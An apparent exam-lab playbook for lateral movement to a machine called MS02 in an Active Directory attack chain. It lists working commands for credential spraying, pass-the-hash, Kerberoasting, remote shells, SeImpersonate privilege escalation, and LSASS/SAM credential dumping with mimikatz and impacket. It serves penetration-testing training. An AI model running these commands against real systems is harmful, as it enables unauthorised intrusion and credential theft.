# 🖥️ MS02 — Lateral Movement

> Machine command playbook for **MS02**, reached by reusing MS01's loot. Steps mirror your Landscape checklist (14 tasks). **Nothing pre-filled** — replace every `<…>` with verified values; paste real output/screenshots where marked. Never record a guessed value.

Part of [[Active Directory]]. Attack path: [[MS01 — Initial Foothold|MS01]] → **MS02** → [[DC01 — Domain Controller|DC01]] · overview: [[AD Attack Path — MS01 to DC01]].

---

## 🎯 VERIFIED ENVIRONMENT (fill from your lab)
| Field | Value |
|---|---|
| IP | `<MS02_IP>` |
| Hostname | `<MS02_HOST>` |
| Domain | `<DOMAIN>` |
| Cred that worked here | `<user>:<pass>` or `<user>:<NThash>` |
| Local-admin? | `<Pwn3d!? yes/no>` |
| proof.txt | `<flag>` |

```bash
export IP=<MS02_IP> DOMAIN=<domain.tld> U=<user> P='<pass>' H='<NThash>'
```
> Carry in from [[MS01 — Initial Foothold]]: creds/hashes (steps 7–11, 19–20) and the BloodHound path (21).

---

## 🔎 RECON

### 1. Locate MS02 on the BloodHound path — `Recon`
- In [[BloodHound]], mark MS01's user **Owned**, run *Shortest Path from Owned Principals*; confirm MS02 is the next hop and **why** (AdminTo / HasSession / an ACL edge).
- `# ← note the edge type that reaches MS02` · `![[ms02-01-bhpath.png]]`

### 2. Scan MS02 TCP/UDP services — `Recon`
```bash
sudo nmap -sC -sV -p- --min-rate 5000 <MS02_IP> -oN nmap/ms02-tcp.txt
```
```bash
sudo nmap -sU -p88,53,161 <MS02_IP> -oN nmap/ms02-udp.txt
```
- **Look for:** 445/5985/3389 (exec surfaces); is MS02 reachable directly or only via a pivot from MS01? ([[Pivoting and Port Forwarding]]).
- `# ← paste open ports` · `![[ms02-02-nmap.png]]`

---

## 🔍 ENUM

### 3. Spray MS01 creds/hashes vs MS02 — `Enum`
```bash
netexec smb <MS02_IP> -u $U -p $P                      # plaintext
```
```bash
netexec smb <MS02_IP> -u $U -H $H                      # pass-the-hash
```
```bash
netexec smb <MS02_IP> -u users.txt -H hashes.txt --continue-on-success
```
- **Look for:** `[+]` (valid) / `(Pwn3d!)` (local admin here). See [[Credential Reuse]], [[Pass-the-Hash]].
- `# ← which MS01 cred/hash validates on MS02` · `![[ms02-03-spray.png]]`

### 4. Find which harvested user is local admin — `Enum`
```bash
for h in $(cat hashes.txt); do netexec smb <MS02_IP> -u <user> -H $h | grep -i pwn; done
```
- **Look for:** the one account returning `(Pwn3d!)` on MS02 → that's your exec path.
- `# ← record the local-admin principal` · `![[ms02-04-admin.png]]`

### 5. Enumerate shares & sessions on MS02 — `Enum`
```bash
netexec smb <MS02_IP> -u $U -p $P --shares --sessions --loggedon-users
```
- **Look for:** readable shares (more loot), and **who is logged on** (their creds may be dumpable at step 11).
- `# ← paste shares + logged-on users` · `![[ms02-05-sessions.png]]`

---

## 🗡️ ATTACK

### 6. Pass-the-Hash / Overpass-the-Hash to MS02 — `Attack`
```bash
impacket-psexec <DOMAIN>/<user>@<MS02_IP> -hashes :<NThash>
```
```bash
# overpass-the-hash: NT hash -> Kerberos TGT, then use the ticket
impacket-getTGT <DOMAIN>/<user> -hashes :<NThash> ; export KRB5CCNAME=<user>.ccache
```
- **Does:** authenticate with the hash — no cracking ([[Pass-the-Hash]]).
- `# ← record method that worked` · `![[ms02-06-pth.png]]`

### 7. Kerberoast new service accounts — `Attack`
```bash
impacket-GetUserSPNs <DOMAIN>/$U:'$P' -dc-ip <DC_IP> -request -outputfile loot/ms02-kerb.txt
```
```bash
hashcat -m 13100 loot/ms02-kerb.txt /usr/share/wordlists/rockyou.txt
```
- **Does:** any valid domain cred can roast SPNs seen from here ([[Kerberoasting]]).
- `# ← paste SPN hash / cracked svc cred` · `![[ms02-07-kerberoast.png]]`

---

## 🚪 ACCESS

### 8. Get shell (evil-winrm / wmiexec) — `Access`
```bash
evil-winrm -i <MS02_IP> -u <user> -H <NThash>
```
```bash
impacket-wmiexec <DOMAIN>/<user>@<MS02_IP> -hashes :<NThash>
```
- `# ← record shell method + whoami` · `![[ms02-08-shell.png]]`

---

## 🧗 PRIVESC

### 9. `whoami /priv` + WinPEAS — `PrivEsc`
```cmd
whoami /priv
```
```powershell
.\winPEASx64.exe > winpeas.txt
```
- **Look for:** `SeImpersonate` (→ step 10) or any PEAS-flagged path → [[Windows Privilege Escalation]].
- `# ← paste priv list + PEAS highlights` · `![[ms02-09-priv.png]]`

### 10. Abuse SeImpersonate / weak service — `PrivEsc`
```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
```
- **Does:** `SeImpersonate` → SYSTEM ([[Token Privileges & Potato]]); else exploit a weak service ([[Windows Service Exploits]]).
- `# ← paste SYSTEM proof` · `![[ms02-10-system.png]]`

---

## 🔑 CREDS

### 11. Dump LSASS / SAM for cached domain creds — `Creds`
```cmd
reg save HKLM\SAM sam & reg save HKLM\SYSTEM system
```
```bash
impacket-secretsdump -sam sam -system system LOCAL
```
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
- **Look for:** **higher-priv domain creds cached on MS02** (a domain admin may have logged in here) → the key to DC01.
- `# ← paste harvested creds (loot)` · `![[ms02-11-lsass.png]]`

### 12. Harvest DPAPI / stored creds & tokens — `Creds`
```cmd
cmdkey /list
```
```powershell
# DPAPI blobs, vaults, browser creds — mimikatz dpapi:: / SharpDPAPI
```
- **Look for:** saved runas creds, vault secrets, tokens to impersonate.
- `# ← record stored creds` · `![[ms02-12-dpapi.png]]`

---

## 🏰 AD

### 13. Re-run BloodHound from MS02 context — `AD`
```powershell
.\SharpHound.exe -c All -d <DOMAIN>
```
- **Does:** mark MS02 + any new principals **Owned** → re-check shortest path to DA; a cred from step 11 may now have **DCSync** or a direct DA edge.
- **Next:** carry the DA/priv cred to [[DC01 — Domain Controller]].
- `# ← note new path to DA` · `![[ms02-13-bloodhound.png]]`

---

## 🏁 PROOF

### 14. Grab proof.txt on MS02 — `Proof`
```cmd
type C:\Users\Administrator\Desktop\proof.txt
```
- Screenshot flag + target IP (`ipconfig`) + `whoami` ([[Exam Workflow]]).
- `# ← record flag` · `![[ms02-14-proof.png]]`

---

## ➡️ HANDOFF TO DC01
Carry to [[DC01 — Domain Controller]]: the highest-priv cred/hash harvested here (step 11), any Kerberoast crack (7), and the updated BloodHound path (13). If a cached cred has DCSync rights → straight to DC01's Creds block.
